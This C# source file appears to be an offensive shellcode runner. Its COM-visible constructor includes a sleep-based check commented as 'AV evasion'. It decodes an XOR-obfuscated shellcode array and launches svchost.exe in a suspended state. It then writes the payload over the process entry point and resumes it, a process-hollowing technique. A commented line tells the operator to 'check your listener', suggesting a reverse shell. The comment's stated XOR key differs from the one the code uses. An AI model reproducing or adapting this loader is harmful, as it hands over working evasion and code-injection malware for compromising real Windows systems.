using System;
using System.Runtime.InteropServices;

namespace Runner {

[ComVisible(true)]
public class TestClass
{
    public const uint CREATE_SUSPENDED = 0x4;
    public const int PROCESSBASICINFORMATION = 0;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct ProcessInfo
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 ProcessId;
        public Int32 ThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct StartupInfo
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct ProcessBasicInfo
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
        ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
        int dwSize, out IntPtr lpNumberOfbytesRW);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    public TestClass()
    {
        // AV evasion: Sleep for 10s and detect if time really passed
        DateTime t1 = DateTime.Now;
        Sleep(10000);
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 9.5)
        {
            return;
        }

        // XORed with key 0xfa
        byte[] buf = new byte[] { 0x5c, 0xe8, 0x23, 0x44, 0x50, 0x48, 0x6c, 0xa0, 0xa0, 0xa0, 0xe1, 0xf1, 0xe1, 0xf0, 0xf2, 0xf1, 0xf6, 0xe8, 0x91, 0x72, 0xc5, 0xe8, 0x2b, 0xf2, 0xc0, 0xe8, 0x2b, 0xf2, 0xb8, 0xe8, 0x2b, 0xf2, 0x80, 0xe8, 0x2b, 0xd2, 0xf0, 0xed, 0x91, 0x69, 0xe8, 0xaf, 0x17, 0xea, 0xea, 0xe8, 0x91, 0x60, 0x0c, 0x9c, 0xc1, 0xdc, 0xa2, 0x8c, 0x80, 0xe1, 0x61, 0x69, 0xad, 0xe1, 0xa1, 0x61, 0x42, 0x4d, 0xf2, 0xe8, 0x2b, 0xf2, 0x80, 0xe1, 0xf1, 0x2b, 0xe2, 0x9c, 0xe8, 0xa1, 0x70, 0xc6, 0x21, 0xd8, 0xb8, 0xab, 0xa2, 0xaf, 0x25, 0xd2, 0xa0, 0xa0, 0xa0, 0x2b, 0x20, 0x28, 0xa0, 0xa0, 0xa0, 0xe8, 0x25, 0x60, 0xd4, 0xc7, 0xe8, 0xa1, 0x70, 0xf0, 0x2b, 0xe8, 0xb8, 0xe4, 0x2b, 0xe0, 0x80, 0xe9, 0xa1, 0x70, 0x43, 0xf6, 0xed, 0x91, 0x69, 0xe8, 0x5f, 0x69, 0xe1, 0x2b, 0x94, 0x28, 0xe8, 0xa1, 0x76, 0xe8, 0x91, 0x60, 0xe1, 0x61, 0x69, 0xad, 0x0c, 0xe1, 0xa1, 0x61, 0x98, 0x40, 0xd5, 0x51, 0xec, 0xa3, 0xec, 0x84, 0xa8, 0xe5, 0x99, 0x71, 0xd5, 0x78, 0xf8, 0xe4, 0x2b, 0xe0, 0x84, 0xe9, 0xa1, 0x70, 0xc6, 0xe1, 0x2b, 0xac, 0xe8, 0xe4, 0x2b, 0xe0, 0xbc, 0xe9, 0xa1, 0x70, 0xe1, 0x2b, 0xa4, 0x28, 0xe8, 0xa1, 0x70, 0xe1, 0xf8, 0xe1, 0xf8, 0xfe, 0xf9, 0xfa, 0xe1, 0xf8, 0xe1, 0xf9, 0xe1, 0xfa, 0xe8, 0x23, 0x4c, 0x80, 0xe1, 0xf2, 0x5f, 0x40, 0xf8, 0xe1, 0xf9, 0xfa, 0xe8, 0x2b, 0xb2, 0x49, 0xeb, 0x5f, 0x5f, 0x5f, 0xfd, 0xe9, 0x1e, 0xd7, 0xd3, 0x92, 0xff, 0x93, 0x92, 0xa0, 0xa0, 0xe1, 0xf6, 0xe9, 0x29, 0x46, 0xe8, 0x21, 0x4c, 0x00, 0xa1, 0xa0, 0xa0, 0xe9, 0x29, 0x45, 0xe9, 0x1c, 0xa2, 0xa0, 0xbf, 0x30, 0x60, 0x08, 0x91, 0xd9, 0xe1, 0xf4, 0xe9, 0x29, 0x44, 0xec, 0x29, 0x51, 0xe1, 0x1a, 0xec, 0xd7, 0x86, 0xa7, 0x5f, 0x75, 0xec, 0x29, 0x4a, 0xc8, 0xa1, 0xa1, 0xa0, 0xa0, 0xf9, 0xe1, 0x1a, 0x89, 0x20, 0xcb, 0xa0, 0x5f, 0x75, 0xca, 0xaa, 0xe1, 0xfe, 0xf0, 0xf0, 0xed, 0x91, 0x69, 0xed, 0x91, 0x60, 0xe8, 0x5f, 0x60, 0xe8, 0x29, 0x62, 0xe8, 0x5f, 0x60, 0xe8, 0x29, 0x61, 0xe1, 0x1a, 0x4a, 0xaf, 0x7f, 0x40, 0x5f, 0x75, 0xe8, 0x29, 0x67, 0xca, 0xb0, 0xe1, 0xf8, 0xec, 0x29, 0x42, 0xe8, 0x29, 0x59, 0xe1, 0x1a, 0x39, 0x05, 0xd4, 0xc1, 0x5f, 0x75, 0x25, 0x60, 0xd4, 0xaa, 0xe9, 0x5f, 0x6e, 0xd5, 0x45, 0x48, 0x33, 0xa0, 0xa0, 0xa0, 0xe8, 0x23, 0x4c, 0xb0, 0xe8, 0x29, 0x42, 0xed, 0x91, 0x69, 0xca, 0xa4, 0xe1, 0xf8, 0xe8, 0x29, 0x59, 0xe1, 0x1a, 0xa2, 0x79, 0x68, 0xff, 0x5f, 0x75, 0x23, 0x58, 0xa0, 0xde, 0xf5, 0xe8, 0x23, 0x64, 0x80, 0xfe, 0x29, 0x56, 0xca, 0xe0, 0xe1, 0xf9, 0xc8, 0xa0, 0xb0, 0xa0, 0xa0, 0xe1, 0xf8, 0xe8, 0x29, 0x52, 0xe8, 0x91, 0x69, 0xe1, 0x1a, 0xf8, 0x04, 0xf3, 0x45, 0x5f, 0x75, 0xe8, 0x29, 0x63, 0xe9, 0x29, 0x67, 0xed, 0x91, 0x69, 0xe9, 0x29, 0x50, 0xe8, 0x29, 0x7a, 0xe8, 0x29, 0x59, 0xe1, 0x1a, 0xa2, 0x79, 0x68, 0xff, 0x5f, 0x75, 0x23, 0x58, 0xa0, 0xdd, 0x88, 0xf8, 0xe1, 0xf7, 0xf9, 0xc8, 0xa0, 0xe0, 0xa0, 0xa0, 0xe1, 0xf8, 0xca, 0xa0, 0xfa, 0xe1, 0x1a, 0xab, 0x8f, 0xaf, 0x90, 0x5f, 0x75, 0xf7, 0xf9, 0xe1, 0x1a, 0xd5, 0xce, 0xed, 0xc1, 0x5f, 0x75, 0xe9, 0x5f, 0x6e, 0x49, 0x9c, 0x5f, 0x5f, 0x5f, 0xe8, 0xa1, 0x63, 0xe8, 0x89, 0x66, 0xe8, 0x25, 0x56, 0xd5, 0x14, 0xe1, 0x5f, 0x47, 0xf8, 0xca, 0xa0, 0xf9, 0xe9, 0x67, 0x62, 0x50, 0x15, 0x02, 0xf6, 0x5f, 0x75,  };

        // Start 'svchost.exe' in a suspended state
        StartupInfo sInfo = new StartupInfo();
        ProcessInfo pInfo = new ProcessInfo();
        bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
            false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
        Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

        ProcessBasicInfo pbInfo = new ProcessBasicInfo();
        uint retLen = new uint();
        long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
        IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
        Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

        byte[] procAddr = new byte[0x8];
        byte[] dataBuf = new byte[0x200];
        IntPtr bytesRW = new IntPtr();
        bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
        IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
        result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);

        uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);

        uint rvaOffset = e_lfanew + 0x28;

        uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);

        IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);

        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xa0);
        }

        result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);

        uint rResult = ResumeThread(pInfo.hThread);
        //Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
    }

    [STAThread]
    static void Main()
    {
    }

}
}
